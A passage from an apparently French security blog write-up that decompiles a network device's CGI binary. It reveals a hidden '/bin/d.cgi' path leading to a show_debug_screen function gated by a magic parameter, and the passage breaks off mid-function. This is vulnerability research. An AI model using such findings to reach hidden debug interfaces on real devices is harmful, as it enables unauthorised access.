&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">undefined4&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">undefined4&lt;/span> &lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">undefined4&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">iVar1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">__ptr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">pvVar2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">code&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">pcVar3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">pcVar4&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">undefined4&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">puVar5&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">pcVar6&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">acStack_70&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">acStack_30&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">install_ui&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">ui&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">get_pvalue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">DAT_00477b24&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">print_http_header&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;html&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">print_header&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">print_flag_screen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">iVar1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;/html&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">memcmp&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;/ndbin/netdetect.cgi&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x15&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">__ptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">post_process&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">__ptr&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pcVar4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">get_pvalue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;commit&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pcVar4&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pvVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">puVar5&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">param_2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">goto&lt;/span> &lt;span class="n">LAB_0040b738&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">get_value_post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">__ptr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;commit&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">acStack_70&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pcVar4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">acStack_70&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">puVar5&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">undefined4&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pvVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">__ptr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nl">LAB_0040b738&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">commit_process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">puVar5&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pvVar2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pcVar4&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pvVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">get_pvalue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;savesave&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">pvVar2&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">memcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pvVar2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">DAT_004779a8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">syslog_msg&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;All configruations are saved&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">saveconf&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">print_http_header&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pcVar4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">((((((&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">pcVar4&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pcVar4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pcVar4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;i&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">(((&lt;/span>&lt;span class="n">pcVar4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;n&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pcVar4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">((&lt;/span>&lt;span class="n">pcVar4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;d&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">pcVar4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pcVar4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;c&amp;#39;&lt;/span>&lt;span class="p">))))))))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pcVar4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;g&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pcVar4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;i&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">show_debug_screen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nl">LAB_0040af44&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;/html&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fflush&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_DAT_000003e0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>On peut clairement appercevoir une référence au chemin &lt;strong>/bin/d.cgi&lt;/strong> ainsi qu&amp;rsquo;un appel à la fonction &lt;strong>show_debug_screen(param_2)&lt;/strong>. Ayant un nom intéressant, faisons donc le même exercice d&amp;rsquo;analyse pour cette fonction.&lt;/p>
&lt;div class="gblog-expand">
&lt;label class="gblog-expand__head flex justify-between" for="8d2da5f0-6">
&lt;span>Pseudo-code complet de show_debug_screen&lt;/span>
&lt;span>↕&lt;/span>
&lt;/label>
&lt;input id="8d2da5f0-6" type="checkbox" class="gblog-expand__control hidden" />
&lt;div class="gblog-markdown--nested gblog-expand__content">
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">show_debug_screen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">undefined4&lt;/span> &lt;span class="n">param_1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">iVar1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">FILE&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">pFVar2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">pcVar3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">acStack_4b8&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">128&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">acStack_438&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">512&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">undefined1&lt;/span> &lt;span class="n">auStack_238&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">undefined1&lt;/span> &lt;span class="n">auStack_218&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">256&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_118&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_117&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_116&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_115&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_114&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_113&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_112&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_111&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_110&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_10f&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_10e&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_10d&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_10c&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_10b&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_10a&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_109&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_108&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_107&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">get_remote_support&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">local_118&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">get_value&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">DAT_00477bb0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">auStack_238&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(((&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">memcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">auStack_238&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">DAT_00477bb4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">||&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">((((&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">get_value&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;aaksjdkfj&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_118&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(((&lt;/span>&lt;span class="n">local_118&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;#&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_117&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;n&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_116&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;o&amp;#39;&lt;/span>&lt;span class="p">))))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
